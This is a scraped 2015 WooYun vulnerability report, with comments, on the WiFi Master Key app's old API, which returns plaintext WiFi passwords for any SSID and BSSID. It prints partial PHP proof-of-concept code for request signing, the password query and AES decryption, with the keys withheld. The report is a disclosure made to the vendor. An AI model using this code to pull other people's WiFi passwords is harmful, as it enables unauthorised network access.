{"id": 33703, "wybug_id": "wooyun-2015-099268", "wybug_title": "WIFI万能钥匙密码查询接口算法破解（可无限查询用户AP明文密码）", "wybug_corp": "WiFi万能钥匙", "wybug_author": "路人甲", "wybug_date": "2015-03-03 16:59", "wybug_open_date": "2015-06-04 12:58", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向公众公开  简要描述： http://zone.wooyun.org/content/18815，我是看到这篇帖子后萌生的想法。。。现在不用装APP，也能查询你家的WIFI明文密码了。 详细说明：  凡是APP就涉及到通信接口，看了下万能钥匙的APP，走的明文HTTP协议这就简单了。分析Android程序有个杀手锏，就是程序在更新迭代的时候新版本做了API改动，但为了兼容考虑，老版本存在问题的API不会下线，一直存在线上。。。\n\n从GooglePlay下载了1.X版本的WIFI万能钥匙，确实还能用，通过程序包分析算法（说一下在，各种key，salt明文存储，连混淆哪怕是字符拼接都没有。。。）\n\n这个是查询密码用到的数据包，以及参数中sign（签名）的算法，其实就是这些数据进行排序后用salt算个md5。新版本的万能钥匙还有个retSn，实现链式认证，也能突破，但这个报告只说1.x版本的API问题（1.x时代很多细节明显没有考虑完善，基本只靠sign做安全）。\n\n用JAVA实现查询密码请求的签名\n\n为了验证真实性，我给附近的一台OpenWrt SSID前加了个“1OpenWrt”，在计算签名查询，bingo！\n\n第一部分完成了，但发现返回的密码竟然好长一串似乎还真没泄漏用户明文密码哎，但没明文客户端怎么连接呢。。。通过apk分析发现是用了AES加密，当然key和iv也泄漏了。\n\n继续用JAVA程序实现\n\n嘿嘿，原来你家密码是这个（跟这个朋友的分析一致 http://drops.wooyun.org/papers/4976）另外测试的过程中突然提示\n\n经过分析原来是dhid每日有查询限额，继续分析dhid算法，是通过服务器返回的，具体伪造不在说了，基本还是分析包，打包sign，发包了。   漏洞证明：  \n\n\n\n这样，就实现了通过SSID，和BSSID查询任意AP明文密码了，本地写了个自用的玩玩。为了证明真实并且避免被恶意利用，我只放出部分POC代码，厂商一看就懂。\nfunction sign( $array , $do ){\t// 签名算法\t$request_str = '';\t$salt = '';\t$sign = '';\t// 对应apk中的 Arrays.sort 数组排序，测试PHP需用 ksort \tksort( $array );\tforeach ($array as $key => $value) {\t\t$request_str .= $value;\t}\tif ( $do == 'querypwd') {\t\t$sign = md5( $request_str . SALT );\t} elseif ( $do == 'querydhid' ) {\t\t$sign = md5( $request_str . SALT2 );\t} else {\t\tNULL;\t}\treturn $sign;}\n查询密码的\nfunction get_pwd(){\t$ssid = addslashes( $_POST['ssid'] );\t$mac = addslashes( $_POST['mac'] );\t$data = '';\t$array = array(\t\t\"och\" => \"guanwang\",\t\t \"ii\"=> \"123456789012345\",\t\t\"appid\"=> \"0006\",\t\t\"pid\"=> \"qryapwd:commonswitch\",\t\t\"mac\"=>\"xx:xx:xx:xx:xx:xx\",\t\t\"lang\"=>\"cn\",\t\t\"bssid\"=>\"$mac,\",\t\t\"v\"=>\"58\",\t\t\"ssid\"=>\"$ssid,\",\t\t\"method\"=>\"getSecurityCheckSwitch\",\t\t\"uhid\"=> \"a0000000000000000000000000000001\",\t\t\"st\"=> \"m\",\t\t\"chanid\"=> \"googleplay\",\t\t\"dhid\" => get_dhid()\t);\t$sign = sign( $array , 'querypwd' );\tforeach ($array as $key => $value) {\t\tif ( $key == 'bssid') {\t\t\t$data .= \"sign=\" . strtoupper($sign) . \"&\";\t\t}\t\t$data .= \"$key=\" . urlencode( $value ) . \"&\";\t}\nAES解密的\nfunction decryptStrin($str,$keys=AESKey,$iv=AESIV,$cipher_alg=MCRYPT_RIJNDAEL_128){    //Wi-Fi万能钥匙密码采用 AES/CBC/NoPadding 方式加密    $decrypted_string = mcrypt_decrypt($cipher_alg, $keys, pack(\"H*\",$str),MCRYPT_MODE_CBC, $iv);    return $decrypted_string;}\n整个过程感觉自己又学到不少啊。。。PS：旧版本是默认分享用户WIFI的，1.0.8这个版本，厂商还记得吧？确实是用户同意的前提，不知情的同意？\n\n\n\n   修复方案：  解决方案引用官方的话：问问你身边的Android程序员。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-03-06 12:56 厂商回复： 感谢您的关注，已将问题转交至相关团队。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-03 17:03 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  能雷劈么~？    \n     2015-03-03 17:04 |    \t\tduang \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 其实第一次来乌云我是拒绝的,因为你不能让...)\t\t \n  火钳留名    \n     2015-03-03 17:06 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  一楼？    \n     2015-03-03 17:06 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:977 漏洞数:264        | 天地本不仁 万物为刍狗)\t\t \n  @泳少  别匿名了  就是你  对  洞主就是你  /抠鼻    \n     2015-03-03 17:10 |    \t\t无心、 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:20        | 你不是风儿，我也不是沙，再怎么缠绵也到不...)\t\t \n  @天地不仁 以万物为刍狗 火前留名    \n     2015-03-03 17:15 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @天地不仁 以万物为刍狗 这个叼！肯定不是一楼    \n     2015-03-03 17:15 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  我好想安装个测试下，但又怕它把我的密码发给你们了，怎么办？    \n     2015-03-03 17:23 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @天地不仁 以万物为刍狗 =。=不是我。。我小号    \n     2015-03-03 17:23 |    \t\tssss \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:19        | 虫子是给早起的勤奋的鸟儿七的。)\t\t \n  路人    \n     2015-03-03 17:59 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  洞主找他们要一辆特斯拉好了，反正他们年终奖每人发一台    \n     2015-03-03 18:03 |    \t\t腹黑 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | (◦ \"̮ ◦))\t\t \n  洞主找他们要一辆特斯拉好了，反正他们年终奖每人发一台    \n     2015-03-03 18:15 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @专业种田 有个功能叫做修改密码！    \n     2015-03-03 18:30 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  逆向安卓客户端算法就行了吧，算法在里面有，不知道有混淆没    \n     2015-03-03 18:33 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  反编译非法吗？    \n     2015-03-03 18:46 |    \t\tSecurity \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        )\t\t \n  有点意思，无线名字有很多重复的吧，难道还有位置参数。    \n     2015-03-03 18:48 |    \t\tCode_Monkey \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:7        | Code Monkey think someday he have everyt...)\t\t \n  最近万能钥匙很火啊.  以前谁来我家要连接WIFI必然是我拿着他们手机亲自连接的. 目的很简单, 我看看有没有万能钥匙. 有的话, 我叫他们卸载了才连接...    \n     2015-03-03 18:56 |    \t\t呼呼大侠 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 一只默默学习的菜菜)\t\t \n  火钳留名    \n     2015-03-03 19:05 |    \t\tyichin \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 233=_=)\t\t \n  发编译出来的吗？    \n     2015-03-03 19:28 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  我是来看闪电的！    \n     2015-03-03 19:44 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  卧槽，打雷了    \n     2015-03-03 19:54 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  果然闪电了    \n     2015-03-03 20:14 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  先mark下    \n     2015-03-03 20:19 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  mark,果然闪电了。    \n     2015-03-03 20:46 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  劈了!~~~关注下    \n     2015-03-03 20:51 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  真能雷劈了。呵呵    \n     2015-03-03 21:16 |    \t\tSuner \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 洞次打次)\t\t \n  关注下一    \n     2015-03-03 21:38 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  mark    \n     2015-03-03 22:08 |    \t\tlight \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:48        | 精华漏洞数:36 | WooYun认证√ 艺术系教授 ...)\t\t \n  @Security 肯定有记录MAC地址啊    \n     2015-03-03 22:19 |    \t\tian \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 欢迎各位大牛加我哦)\t\t \n  流弊66666666     \n     2015-03-03 22:37 |    \t\tSecurity \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        )\t\t \n  @light 竟然忘了这回事了... :(    \n     2015-03-03 22:54 |    \t\t东方不败 \t\t\t( 普通白帽子  |\t\t\t        Rank:440 漏洞数:66        | 日出东方，唯我不败。)\t\t \n  5亿字典在手，天下WIFI随我连    \n     2015-03-03 23:09 |    \t\t孤影 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 一万年太久，只争朝夕。)\t\t \n  楼上果然都是好洞主啊,wifi在手，天下我有    \n     2015-03-03 23:21 |    \t\t飞鸡 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 看，有飞鸡)\t\t \n  记者看这    \n     2015-03-04 06:54 |    \t\t萌萌哒-花粉 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | 多乌云 多美女 花粉 顾名思义 就是校花班花...)\t\t \n  闪电了    \n     2015-03-04 10:41 |    \t\t奋斗的阿呆 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:30        | 一二三，不许动！)\t\t \n  @Code_Monkey 人家连上了再装。。。    \n     2015-03-06 13:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  5分滚粗    \n     2015-03-06 13:50 |    \t\t不期而遇 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | 向大牛学习)\t\t \n  程序员年终的特斯拉没了    \n     2015-03-06 14:48 |    \t\tFenQing \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | FenQing)\t\t \n  都闪电了才5分啊    \n     2015-03-06 16:00 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  恭喜洞主精华漏洞获取10rank...    \n     2015-03-09 14:09 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  厂商评分不厚道呀....    \n     2015-03-09 20:04 |    \t\t小清新 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 以后再写)\t\t \n  5分有点太少了把    \n     2015-03-10 12:37 |    \t\t眯眯眼 \t\t\t( 普通白帽子  |\t\t\t        Rank:304 漏洞数:67        | 精华漏洞数:22 | WooYun认证√ 漏洞审核员)\t\t \n  @疯狗  海尔走的是小厂商吗?    \n     2015-03-12 00:50 |    \t\t椰子比尔 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 安全任重道远！！！)\t\t \n  怎么看不到细节？XXX     \n     2015-03-26 15:18 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  这尼玛也5分~    \n     2015-05-18 14:45 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  关联文章http://drops.wooyun.org/tips/6049    \n     2015-06-04 14:15 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  @瘦蛟舞 @泳少  泳少，好屌，原来@瘦蛟舞 是你小号，没办法，我就是这么机智    \n     2015-06-04 15:13 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @胡小树 你这么机智你妈妈知道吗？：)    \n     2015-06-05 02:16 |    \t\tSuperRookie \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n   着要是不精华没天理    \n     2015-09-13 15:02 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  这种也不算洞吧，APP需要查询，肯定要有相关的api,不管怎么混淆，只要逆向技术过硬，总能找到    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}